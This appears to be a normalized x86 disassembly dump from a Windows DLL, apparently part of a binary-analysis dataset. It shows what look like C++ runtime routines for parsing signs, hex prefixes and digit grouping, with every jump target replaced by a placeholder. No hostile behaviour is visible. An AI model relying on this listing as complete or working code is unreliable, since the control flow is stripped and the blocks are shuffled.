call sub_10007b6c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005d9c
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_1003c182
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_100070de
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_1004458c
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10006cbe
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005d9c
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_10005eb7
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_10006709
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001e10
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_1003c182
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_1001c430
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005d9c
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005eb7
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007bdc
push eax
lea ecx [ ebp - 0x98 ]
call sub_10006a70
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007bdc
push eax
lea ecx [ ebp - 0x98 ]
call sub_10006a70
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xec ]
call sub_10002597
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005d9c
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_10006cbe
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005d9c
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_10005d9c
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_10002597
mov ecx [ ebp - 0x6c ]
call sub_10005d9c
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_10006af5
mov ecx [ ebp - 0x6c ]
call sub_10005eb7
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_1003c040
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005eb7
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_1003c182
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002033
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005d9c
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005c07
mov ecx [ ebp - 0x6c ]
call sub_10005eb7
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10005d9c
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_1003c040
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_1001c430
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005d9c
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10002597
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_100023ce
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_10002597
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_10005c07
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_10005eb7
push [ ebp - 0x74 ]
push edi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_10002597
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_10005d9c
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005c07
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005eb7
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_1003c040
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10002033
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002597
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10005d9c
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100023ce
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc edi
mov ecx esi
call sub_10005eb7
push [ ebp - 0x74 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_10005d9c
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_10005d9c
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005c07
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_1003ed60
push 0x11c
mov eax sub_10047fe5
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003da85
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1003db22
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007b41
add esi 0x8
push esi
push edi
push 0x30
call sub_100070de
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_1004458c
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_1003c1ed
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_10001b23
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c182
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c040
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c0be
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10002033
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002597
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_10002033
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_10002597
lea ecx [ ebp - 0x64 ]
call sub_10001b23
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1003c1ed
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b549
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b549
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b549
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007b6c
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b50d
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_1003b549
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002597
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002597
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_10002597
mov eax [ ebp - 0x84 ]
call sub_10023f1f
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007b6c
mov ecx eax
call sub_1003bd60
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b50d
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007b6c
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007b6c
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007b6c
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b50d
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10005d76
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007bdc
mov ecx eax
call sub_1001e200
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_10005d76
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10005d76
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b549
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007b6c
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_1003f2ae
push 0x10
mov eax sub_1004800d
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1003e31b
push edi
push ebx
push eax
call sub_10006d18
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1003e35a
push edi
push ebx
push eax
call sub_10006d18
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10046dc4
mov [ esi + 0x10 ] eax
call sub_10023f0b
retn 0x4
sub_1003f331
push 0x64
mov eax sub_10048038
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_1003dd96
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1004458c
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_1003a3ed
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_1003bad8
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_1003a3ed
add esp 0xc
mov ecx edi
mov bx ax
call sub_1003bc51
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x2d
call sub_1003a3ed
add esp 0xc
mov ecx edi
mov bx ax
call sub_1003bc51
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_1003b9f8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_1003bc51
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_1003b9f8
push [ ebp - 0x5c ]
push edi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_1003bc51
movzx eax ax
push eax
call sub_1003ad39
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_100208d0
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_1003a3ed
add esp 0xc
mov ecx edi
mov bx ax
call sub_1003bc51
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005ad1
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_1003a3ed
add esp 0xc
mov ecx edi
mov bx ax
call sub_1003bc51
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1003b9f8
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_1003bc51
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100023ce
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x50 ]
call sub_10023f1f
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc ebx
mov ecx edi
call sub_1003b9f8
push [ ebp - 0x5c ]
push edi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_1003f681
push 0x60
mov eax sub_10048b59
call sub_10023e9c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_1003dd96
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_1004458c
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_1003a3ed
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_1003bad8
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_1003b9f8
push [ ebp - 0x58 ]
push esi
